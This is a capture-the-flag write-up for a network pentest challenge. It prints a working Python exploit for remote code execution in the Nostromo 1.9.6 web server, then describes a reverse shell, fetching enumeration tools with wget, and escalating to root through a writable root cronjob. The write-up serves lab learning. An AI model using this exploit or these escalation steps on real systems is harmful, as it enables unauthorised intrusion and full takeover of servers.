![](https://i.ibb.co/GCRdnBj/chaldesc.png)


This challenge was in the network pentest category, they gave us an openvpn config file to connect to the network and an IP address of the target.
After doing some recon, we end up with these results.

![](https://i.ibb.co/r3FnC6F/recon.png)

Entering cgi-bin we find the printenv file:

![](https://i.ibb.co/Fhx9kvB/nostromo.png)

OOh nostromo exploit what a surprise! This version(1.9.6) is vulnerable to a RCE attack. Here is the exploit script:

```python
import socket
import argparse

parser = argparse.ArgumentParser(description='Nostromo Remote Code execution')
parser.add_argument('host',help='domain/IP of the Nostromo web server')
parser.add_argument('port',help='port number',type=int)
parser.add_argument('cmd',help='command to execute, default is id',default='id',nargs='?')
args = parser.parse_args()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


payload = "POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\n"
payload += "Content-Length: 1\r\n\r\necho\necho\n"
payload += "%s 2>&1" % args.cmd

print ("[+] Connecting to target")
s.connect((args.host , int(args.port)))

print("[+] Sending malicious payload")
s.sendall(payload.encode('utf-8') )


data = []

while True:
    chunk = s.recv(1024)  #blocks while waiting for data
    if chunk: data.append(chunk.decode("utf-8"))
    #If the recv() returns a blank string, then the other side
    #closed the socket, and no more data will be sent:
    else: break  

print("".join(data))
```

Here are the steps to get an initial shell and upgrading it to an interactive one. Unfortunately, webserver user doesnt have permissions to read files from root dir.

![](https://i.ibb.co/MMTfwtr/exp-beu.png)

After we got our reverse shell, we needed to do some enumeration. To do so, i set up a SimpleHttpServer with python and wget pspy and linenum.

From pspy's output, we can see a cronjob called healthchecked runned by root.

![](https://i.ibb.co/ZHfs17t/pspy.png)

And guess what, we got write permissions on it. So, that should give us the privilige escalation to root. This is how i did it:

![](https://i.ibb.co/5FqBsqX/exploit.png)

that give us a reverse shell as root. Now we just need to ```cat /root/flag.txt``` to get the flag.
